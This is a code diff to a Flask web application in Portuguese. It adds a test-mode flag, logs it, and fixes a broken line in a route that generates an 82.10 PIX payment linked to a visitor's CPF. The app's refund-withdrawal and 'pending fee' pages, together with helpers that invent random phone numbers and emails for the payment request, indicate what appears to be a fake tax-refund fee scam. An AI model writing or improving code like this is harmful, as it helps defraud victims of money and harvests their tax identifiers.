@@ -43,6 +43,10 @@ def generate_random_phone() -> str:
     return f"{ddd}{numero}"
 
 
+def get_test_mode() -> bool:
+    """Verifica se o modo de teste está ativo"""
+    return os.environ.get('TEST_MODE', 'false').lower() == 'true'
+
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
@@ -399,9 +403,13 @@ def analise_dados():
         flash('Sessão expirada. Por favor, faça a consulta novamente.')
         return redirect(url_for('index'))
 
+    test_mode = get_test_mode()
+    logger.info(f"Análise de dados - TEST_MODE: {test_mode}")
+
     return render_template('analise_dados.html',
                          user_data=user_data,
-                         current_year=datetime.now().year)
+                         current_year=datetime.now().year,
+                         test_mode=test_mode)
 
 
 @app.route('/retirada_restituicao')
@@ -429,9 +437,13 @@ def processar_retirada():
         flash('É necessário confirmar os dados para prosseguir.')
         return redirect(url_for('retirada_restituicao'))
 
+    test_mode = get_test_mode()
+    logger.info(f"Processando retirada - TEST_MODE: {test_mode}")
+
     return render_template('processando_retirada.html',
                          user_data=user_data,
-                         current_year=datetime.now().year)
+                         current_year=datetime.now().year,
+                         test_mode=test_mode)
 
 @app.route('/selecionar_estado', methods=['POST'])
 def selecionar_estado():
@@ -792,7 +804,8 @@ def verificar_taxa():
                     'amount': 82.10
                 }
 
-                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")  # Fixed string syntax                pix_data = payment_api.create_pix_payment(payment_data)
+                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")                
+                pix_data = payment_api.create_pix_payment(payment_data)
                 logger.info(f"PIX data generated successfully: {pix_data}")
 
                 return render_template('taxa_pendente.html',
@@ -849,7 +862,7 @@ def generate_random_phone() -> str:
     ddd = str(random.randint(11, 99))
     # Gera 8 dígitos para o número (sem o 9 na frente)
     numero = ''.join([str(random.randint(0, 9)) for _ in range(8)])
-    return f"{ddd}{numero}"  # Removed 55 prefix as per API requirements
+    return f"{ddd}{numero}"  
 
 def generate_random_email() -> str:
     """
